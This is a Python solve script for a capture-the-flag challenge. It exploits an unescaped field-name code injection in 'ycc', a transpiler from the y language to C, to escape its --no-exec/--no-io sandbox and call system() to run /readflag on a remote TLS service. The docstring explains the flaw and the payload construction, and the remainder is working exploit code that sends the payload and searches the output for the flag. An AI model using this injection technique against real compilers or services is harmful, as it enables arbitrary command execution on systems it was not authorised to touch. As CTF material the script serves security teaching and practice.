#!/usr/bin/env python3
"""ycc — escape ycc's --no-exec/--no-io sandbox via unescaped dot-field C injection.

ycc transpiles y to C. Field access emits `y_map_get(_m, "FIELD")` with FIELD taken
verbatim from the token after '.', with NO escaping (unlike string literals, which are
escaped correctly). The parser accepts a string token there, and a y string can hold a
real '"' via \x22 -- so the field escapes its C string literal and we inject C.

--no-exec/--no-io only delete five y_scope_set() lines from the generated prelude;
runtime.c and libc are still linked, so injected C can call system() directly.

FIELD is interpolated twice (lookup + error message) and the first site is a
declaration, where a top-level ',' is a declarator separator -- so the payload uses the
conditional operator instead of the comma operator. Key "zz" is absent from the map, so
y_map_get returns NULL, the condition is false, and the false branch runs system().

Usage: solve.py <host> [port]
"""
import re
import socket
import ssl
import sys

FIELD = 'zz\\") ? (YValue*)0 : (YValue*)(long)system(\\"/readflag owo'
PAYLOAD = f'eval let m = {{a:1}}; print(m."{FIELD}");\nexit\n'


def main() -> int:
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port), timeout=30) as raw:
        with ctx.wrap_socket(raw, server_hostname=host) as s:
            s.sendall(PAYLOAD.encode())
            out = b""
            s.settimeout(60)
            try:
                while chunk := s.recv(4096):
                    out += chunk
            except (TimeoutError, ssl.SSLError, OSError):
                pass

    text = out.decode(errors="replace")
    print(text)
    m = re.search(r"pwnsec\{[^}]*\}", text)
    if m:
        print("FLAG:", m.group(0))
        return 0
    print("no flag in output", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
